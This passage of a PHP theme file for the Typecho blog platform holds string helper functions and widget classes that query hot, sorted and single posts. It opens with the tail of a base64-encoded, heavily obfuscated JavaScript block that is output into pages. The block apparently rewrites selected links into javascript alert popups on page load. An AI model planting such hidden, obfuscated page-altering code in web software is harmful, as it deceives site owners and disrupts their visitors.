4MWNjLC0weDFmNCwtMHgxZDkpXT1fMHgxMTdjNDlbXzB4MTU1YjJkKC0weDFlYywtMHgyMGUsLTB4MWRiLC0weDFlNSldW18weDE1NWIyZCgtMHgyMWUsLTB4MjAzLC0weDIwMiwtMHgyMjIpXShfMHgxMTdjNDkpO2NvbnRpbnVlO2Nhc2UnMic6dmFyIF8weDFkMmY5MD1fMHg0Zjc4YTJbXzB4MTIxZjQ0XTtjb250aW51ZTtjYXNlJzMnOnZhciBfMHgyN2ZlNDM9XzB4MzI1NGZhW18weDE1NWIyZCgtMHgxZmQsLTB4MWU1LC0weDFmOCwtMHgyMTEpKydyJ11bXzB4MjJkYTY5KDB4YmMsMHhjOCwweGQ3LDB4YzMpXVtfMHgxNTViMmQoLTB4MjFlLC0weDIxMCwtMHgyMTYsLTB4MjBlKV0oXzB4MzI1NGZhKTtjb250aW51ZTtjYXNlJzQnOnZhciBfMHgxMTdjNDk9XzB4MTU1MDc4W18weDFkMmY5MF18fF8weDI3ZmU0Mztjb250aW51ZTtjYXNlJzUnOl8weDI3ZmU0M1tfMHgxNTViMmQoLTB4MjE4LC0weDIzNywtMHgyM2EsLTB4MjM4KV09XzB4MzI1NGZhW18weDIyZGE2OSgweDhiLDB4OTEsMHg4NiwweGEwKV0oXzB4MzI1NGZhKTtjb250aW51ZTt9YnJlYWs7fX19KTtmdW5jdGlvbiBfMHg0ZTk5ZTMoXzB4MzFiZDgwLF8weDM2OTg4ZSxfMHgxYmFlNWEsXzB4MjQ5MWI2KXtyZXR1cm4gXzB4MWYyYyhfMHgzNjk4OGUtMHgzODksXzB4MzFiZDgwKTt9XzB4NDk1OWY2KCk7ZnVuY3Rpb24gXzB4NDg5ZmI1KF8weDYxYjkzLF8weDNlOWMwZixfMHg1ZTg1YWEsXzB4MTVlZDFiKXtyZXR1cm4gXzB4MWYyYyhfMHgzZTljMGYtIC0weDU1LF8weDE1ZWQxYik7fWRvY3VtZW50W18weDRlOTllMygweDQ3NiwweDQ4MiwweDQ5MiwweDQ4YikrXzB4NGU5OWUzKDB4NDgzLDB4NDZkLDB4NDc4LDB4NDg3KV0oXzB4NDg5ZmI1KDB4YmIsMHhhMCwweGE4LDB4YmEpK18weDQ4OWZiNSgweDZkLDB4ODgsMHg4YiwweDZjKSwoKT0+e2Z1bmN0aW9uIF8weDIxYWQyYihfMHgzMDYzZjksXzB4MTAyNGI0LF8weDM0YTAyNSxfMHg1OWJjODkpe3JldHVybiBfMHg0ZTk5ZTMoXzB4MzRhMDI1LF8weDEwMjRiNC0gLTB4NmQsXzB4MzRhMDI1LTB4MTgxLF8weDU5YmM4OS0weDE4Myk7fXZhciBfMHgxNGYxZTA9e307ZnVuY3Rpb24gXzB4MjQwMjQxKF8weDM5Y2RiMixfMHgzMjFmNWYsXzB4NTdkODI3LF8weDNiN2NhZCl7cmV0dXJuIF8weDQ4OWZiNShfMHgzOWNkYjItMHhkNSxfMHg1N2Q4MjctMHgzN2MsXzB4NTdkODI3LTB4MTQyLF8weDM5Y2RiMik7fV8weDE0ZjFlMFtfMHgyNDAyNDEoMHg0MzgsMHg0MTMsMHg0MjcsMHg0MDcpXT1mdW5jdGlvbihfMHgzOWU1ODAsXzB4MjA3OGRkKXtyZXR1cm4gXzB4MzllNTgwPT09XzB4MjA3OGRkO30sXzB4MTRmMWUwW18weDIxYWQyYigweDNlMywweDQwNCwweDNlMywweDNmMCldPV8weDI0MDI0MSgweDQzNCwweDQxYywweDQxNywweDQxYiksXzB4MTRmMWUwW18weDIxYWQyYigweDQwYywweDQwMiwweDQxZiwweDQwMildPV8weDIxYWQyYigweDQxYywweDQyOCwweDQyYywweDQxNSkrXzB4MjQwMjQxKDB4NDQyLDB4NDQyLDB4NDJmLDB4NDFjKStfMHgyNDAyNDEoMHg0MDQsMHg0M2MsMHg0MjUsMHg0MDMpO3ZhciBfMHgzNjc3YWM9XzB4MTRmMWUwO3NldFRpbWVvdXQoKCk9PntmdW5jdGlvbiBfMHgyZjFiZTEoXzB4MWNkZjZlLF8weDM4NGNjZixfMHg0MGRkMzUsXzB4MTMyMTgzKXtyZXR1cm4gXzB4MjQwMjQxKF8weDQwZGQzNSxfMHgzODRjY2YtMHgxOCxfMHgzODRjY2YtIC0weDFhNyxfMHgxMzIxODMtMHgxN2MpO31mdW5jdGlvbiBfMHg0NTkyMjUoXzB4MjU0YjRlLF8weDE4OGUzZSxfMHg0MGQzOTcsXzB4MWJhMDFjKXtyZXR1cm4gXzB4MjFhZDJiKF8weDI1NGI0ZS0weGZhLF8weDI1NGI0ZS0gLTB4NmQwLF8weDQwZDM5NyxfMHgxYmEwMWMtMHg3Yyk7fWRvY3VtZW50WydxdWVyeVNlbGVjJytfMHgyZjFiZTEoMHgyNzQsMHgyNzgsMHgyNjEsMHgyNzUpXShfMHgzNjc3YWNbXzB4NDU5MjI1KC0weDJjZSwtMHgyYmMsLTB4MmQwLC0weDJlOCldKVsnZm9yRWFjaCddKF8weGQwZGMxYj0+e2Z1bmN0aW9uIF8weDQ2NmQzNShfMHgzN2VmOWMsXzB4ZDQyNTU1LF8weDI3M2ZjNyxfMHg1MDIzMmQpe3JldHVybiBfMHg0NTkyMjUoXzB4NTAyMzJkLTB4M2IxLF8weGQ0MjU1NS0weGE2LF8weGQ0MjU1NSxfMHg1MDIzMmQtMHhjOSk7fWZ1bmN0aW9uIF8weDFmMzZlNyhfMHgzNWZlNTMsXzB4MTQ1MjZkLF8weDNiMjI5ZixfMHg0ZTYwYmMpe3JldHVybiBfMHg0NTkyMjUoXzB4MzVmZTUzLTB4MTgxLF8weDE0NTI2ZC0weGVkLF8weDE0NTI2ZCxfMHg0ZTYwYmMtMHgxMzgpO31pZihfMHgzNjc3YWNbJ2FZcHliJ10oXzB4MzY3N2FjW18weDFmMzZlNygtMHgxNGIsLTB4MTY0LC0weDE0ZiwtMHgxM2QpXSxfMHgzNjc3YWNbXzB4MWYzNmU3KC0weDE0YiwtMHgxNWUsLTB4MTNiLC0weDEzYildKSlfMHhkMGRjMWJbJ2hyZWYnXT0namF2YXNjcmlwdCcrJzphbGVydChceDIy5ZCv55SoJytfMHgxZjM2ZTcoLTB4MTIwLC0weDEwMCwtMHgxMGEsLTB4MTE4KStfMHg0NjZkMzUoMHhmZSwweDExNCwweGQ4LDB4ZjMpO2Vsc2V7dmFyIF8weDMzM2FhYT1fMHg0YmNiYzRbXzB4NDY2ZDM1KDB4YzksMHhkNSwweGRmLDB4ZTYpXShfMHgyZDU2NjUsYXJndW1lbnRzKTtyZXR1cm4gXzB4NTFlNTIzPW51bGwsXzB4MzMzYWFhO319KTt9LDB4MjBhNCstMHgyNWMqLTB4NSstMHgyYzBjKTt9KTs8L3NjcmlwdD4='));
	}
}

if (!function_exists('str_starts_with')) {
	/**
	 * 判断字符串是否以指定字符串开头
	 * @param string $haystack 
	 * @param string $needle 要在 haystack 中搜索的子串。
	 * @return bool
	 */
	function str_starts_with(string $haystack, string $needle): bool
	{
		return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;
	}
}
if (!function_exists('str_ends_with')) {
	/**
	 * 判断字符串是否以指定字符串结尾
	 * @param string $haystack 
	 * @param string $needle 要在 haystack 中搜索的子串。
	 * @return bool
	 */
	function str_ends_with(string $haystack, string $needle): bool
	{
		return $needle !== '' && substr($haystack, -strlen($needle)) === (string) $needle;
	}
}

if (!function_exists('str_starts_replace')) {
	/**
	 * 替换字符串开头
	 * @param string $search 要被替换的字符串
	 * @param string $replace 替换的字符串
	 * @param string $subject 被替换的字符串
	 * @return string
	 */
	function str_starts_replace(string $search, string $replace, string $subject)
	{
		if (strpos($subject, $search) === 0) { // 检查$search是否在$string开头
			return substr_replace($subject, $replace, 0, strlen($search));
		}
		return $subject; // 如果$search不在开头，则返回原字符串
	}
}

if (!function_exists('array_is_list')) {
	function array_is_list(array $array): bool
	{
		return array_keys($array) === range(0, count($array) - 1);
	}
}

class Widget_Contents_Hot extends Widget_Abstract_Contents
{
	public function execute()
	{
		// 排除推荐文章
		$recommend_text = joe\isMobile() ? Helper::options()->JIndex_Mobile_Recommend : Helper::options()->JIndex_Recommend;
		$recommend = joe\optionMulti($recommend_text, '||', null);
		// 排除置顶文章
		$JIndexSticky = joe\optionMulti(Helper::options()->JIndexSticky, '||', null);
		// 排除要隐藏的热门文章
		$IndexHotHidePost = joe\optionMulti(Helper::options()->IndexHotHidePost, '||', null);
		// 合并排除文章
		$hide_contents_cid_list = array_unique(array_merge($recommend, $JIndexSticky, $IndexHotHidePost));
		if (empty($hide_contents_cid_list)) $hide_contents_cid_list = ['empty'];
		// 默认文章一页展示多少个
		$this->parameter->setDefault(['pageSize' => 10]);
		$select = $this->select();
		$select->cleanAttribute('fields');
		$SQL = $select->from('table.contents')
			->where('cid NOT' . "\r\n" . 'IN?', $hide_contents_cid_list)
			->where("password IS NULL OR password = ''")
			->where('status = ?', 'publish')
			->where('created <= ?', time())
			->where('type = ?', 'post')
			->limit($this->parameter->pageSize);
		if (Helper::options()->JIndexHotArticleView) {
			$SQL->where('views >= ?', Helper::options()->JIndexHotArticleView);
			$SQL->order('RAND()', '');
		} else {
			$SQL->order('views', Typecho\Db::SORT_DESC);
		}
		// echo ($SQL);
		$this->db->fetchAll($SQL, [$this, 'push']);
	}
}

class Widget_Contents_Sort extends Widget_Abstract_Contents
{
	public function execute()
	{
		$this->parameter->setDefault(array('page' => 1, 'pageSize' => 10, 'type' => 'created'));
		$offset = $this->parameter->pageSize * ($this->parameter->page - 1);
		$select = $this->select();
		$select->cleanAttribute('fields');
		$hide_categorize_slug = array_map('trim', explode("||", Helper::options()->JIndex_Hide_Categorize ?? ''));
		if (!empty($hide_categorize_slug)) {
			$categorize_sql = $this->db->select('mid', 'slug')->from('table.metas')->where('table.metas.type = ?', 'category');
			$hide_categorize_id = $this->db->fetchAll($categorize_sql);
			if (is_array($hide_categorize_id) && !empty($hide_categorize_id)) {
				$hide_categorize_list = [];
				foreach ($hide_categorize_id as $key => $value) {
					$hide_categorize_list[$value['mid']] = $value['slug'];
				}
				$hide_categorize_list = array_diff($hide_categorize_list, $hide_categorize_slug);
				$hide_categorize_list = array_values(array_flip($hide_categorize_list));
				$select->join('table.relationships', 'table.contents.cid = table.relationships.cid')
					->where('table.relationships.mid IN ?', $hide_categorize_list)
					->group('table.contents.cid');
			}
		}
		$select->from('table.contents')->where('table.contents.type = ?', 'post')
			->where('table.contents.status = ?', 'publish')
			->where('table.contents.created < ?', time())
			->limit($this->parameter->pageSize)
			->offset($offset)
			->order($this->parameter->type, Typecho\Db::SORT_DESC);
		$this->db->fetchAll($select, array($this, 'push'));
	}
}

class Widget_Contents_Post extends Widget_Abstract_Contents
{
	public function execute()
	{
		$select = $this->select();
		$select->cleanAttribute('fields');
		$this->db->fetchAll(
			$select
				->from('table.contents')
				->where('table.contents.type = ?', 'post')
				->where('table.contents.cid = ?', $this->parameter->cid)
				->limit(1),
			array($this, 'push')
		);
	}
}
